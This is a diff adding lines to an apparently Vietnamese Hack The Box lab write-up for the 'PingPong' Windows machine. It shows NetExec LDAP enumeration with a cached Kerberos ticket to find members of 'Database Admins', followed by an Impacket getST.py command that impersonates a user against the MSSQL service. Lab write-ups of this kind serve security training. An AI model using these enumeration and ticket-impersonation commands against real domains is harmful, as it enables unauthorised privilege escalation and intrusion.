@@ -794,6 +794,17 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 Dạo quanh khu rừng thì tìm được 2 người thuộc nhóm `Database Admins`, mục tiêu đã được xác định.
 
 ```bash
+~/HTB/Windows/PingPong $ nxc ldap DC2 -k --use-kcache --groups
+<SNIP>
+LDAP        DC2             389    DC2              gMSA Managers                            1
+LDAP        DC2             389    DC2              IT Service Admins                        3
+LDAP        DC2             389    DC2              Database Admins                          2
+LDAP        DC2             389    DC2              SQLServer2005SQLBrowserUser$DC2          0         Members in the group have the required access and privileges to be assigned as the log on account for the associated instance of SQL Server Browser.
+~/HTB/Windows/PingPong $ nxc ldap DC2 -k --use-kcache --groups "database admins"
+LDAP        DC2             389    DC2              [*] None (name:DC2) (domain:PONG.HTB) (signing:None) (channel binding:No TLS cert) (NTLM:False)
+LDAP        DC2             389    DC2              [+] PONG.HTB\pong_gmsa$ from ccache
+LDAP        DC2             389    DC2              C.Adam
+LDAP        DC2             389    DC2              P.Reiner
 ~/HTB/Windows/PingPong $ getST.py pong.htb/pong_gmsa$ -k -no-pass -spn mssqlsvc/DC2 -impersonate c.adam
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
